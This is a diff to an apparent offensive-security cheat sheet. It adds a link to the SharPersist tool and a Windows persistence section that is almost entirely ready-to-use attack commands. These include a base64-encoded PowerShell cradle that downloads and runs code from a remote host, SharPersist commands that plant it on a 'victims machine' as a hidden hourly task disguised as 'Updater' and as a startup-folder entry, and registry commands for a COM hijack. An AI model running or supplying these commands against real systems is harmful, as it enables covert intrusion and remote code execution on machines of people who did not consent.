@@ -308,6 +308,7 @@
 | Windows-privesc-check | https://github.com/pentestmonkey/windows-privesc-check |
 | Windows Privilege Escalation Fundamentals | https://www.fuzzysecurity.com/tutorials/16.html |
 | Windows Privilege Escalation | https://github.com/frizb/Windows-Privilege-Escalation |
+| Sharpersist | https://github.com/mandiant/SharPersist |
 
 ### Exploit Databases
 
@@ -3937,6 +3938,55 @@ Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=<DOMAIN>,DC=<DOMAIN>" 
 
 ```c
 impacket-secretsdump '<USERNAME>:<PASSWORD>@<RHOST>'
+```
+
+##### Persistence
+
+###### Task Scheduler
+
+Powershell
+
+```c
+$str = 'IEX ((new-object net.webclient).downloadstring("http://IP:PORT/a"))'
+PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+```
+
+Linux
+
+```c
+set str 'IEX ((new-object net.webclient).downloadstring("http://IP:PORT/a"))'
+echo -en $str | iconv -t UTF-16LE | base64 -w 0
+```
+
+On victims machine
+
+```c
+C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -n "Updater" -m add -o hourly
+```
+
+Options
+
+```c
+-t is the desired persistence technique.
+-c is the command to execute.
+-a are any arguments for that command.
+-n is the name of the task.
+-m is to add the task (you can also remove, check and list).
+-o is the task frequency.
+```
+
+###### Startup Folder
+
+```c
+C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -f "UserEnvSetup" -m add
+```
+
+###### COM Hijacks
+
+```c
+PS New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
+PS New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\http_x64.dll"
+PS New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
 
 #### Active Directory
